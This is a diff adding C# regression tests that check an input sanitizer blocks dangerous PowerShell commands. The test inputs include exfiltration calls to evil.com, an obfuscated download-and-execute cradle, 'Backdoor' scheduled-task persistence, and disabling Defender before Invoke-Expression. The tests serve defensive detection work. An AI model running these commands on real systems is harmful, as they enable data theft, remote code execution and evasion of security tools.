@@ -860,4 +860,58 @@ public class IpcDtoTests
         Assert.Equal(3, progress.Current);
         Assert.Equal(13, progress.Total);
     }
+
+    // ── Security bypass regression tests ──────────────────────────────
+
+    [Theory]
+    [InlineData("powershell -ec ZQBjAGgAbwAgACIAdABlAHMAdAAi")]  // -ec abbreviation
+    [InlineData("powershell -en ZQBjAGgAbwAgACIAdABlAHMAdAAi")]  // -en abbreviation
+    public void CheckDangerousCommand_EncodedCommandAbbreviations_Blocks(string input)
+    {
+        Assert.NotNull(InputSanitizer.CheckDangerousCommand(input));
+    }
+
+    [Theory]
+    [InlineData("Invoke-RestMethod -Uri http://evil.com/exfil")]
+    [InlineData("irm http://evil.com/data")]
+    public void CheckDangerousCommand_InvokeRestMethod_Blocks(string input)
+    {
+        Assert.NotNull(InputSanitizer.CheckDangerousCommand(input));
+    }
+
+    [Theory]
+    [InlineData("Register-ScheduledTask -TaskName 'Backdoor' -Action $action")]
+    [InlineData("New-ScheduledTaskAction -Execute 'powershell.exe'")]
+    public void CheckDangerousCommand_PowerShellScheduledTask_Blocks(string input)
+    {
+        Assert.NotNull(InputSanitizer.CheckDangerousCommand(input));
+    }
+
+    [Theory]
+    [InlineData("'I'+'EX' (New-Object Net.WebClient).DownloadString('http://evil.com')")]
+    [InlineData("\"Inv\"+\"oke-Expression\" $payload")]
+    public void CheckDangerousCommand_StringConcatenationBypass_Blocks(string input)
+    {
+        Assert.NotNull(InputSanitizer.CheckDangerousCommand(input));
+    }
+
+    [Theory]
+    [InlineData("Set-MpPreference -DisableRealtimeMonitoring $true; Invoke-Expression $payload")]
+    public void CheckDangerousCommand_SemicolonChaining_Blocks(string input)
+    {
+        Assert.NotNull(InputSanitizer.CheckDangerousCommand(input));
+    }
+
+    [Theory]
+    [InlineData("\"{0}{1}\" -f 'Invoke-','Expression'")]
+    public void CheckDangerousCommand_FormatOperatorBypass_Blocks(string input)
+    {
+        Assert.NotNull(InputSanitizer.CheckDangerousCommand(input));
+    }
+
+    [Fact]
+    public void ValidateFilePath_NtPathPrefix_ReturnsNull()
+    {
+        Assert.Null(InputSanitizer.ValidateFilePath(@"\\?\C:\Windows\System32\cmd.exe"));
+    }
 }
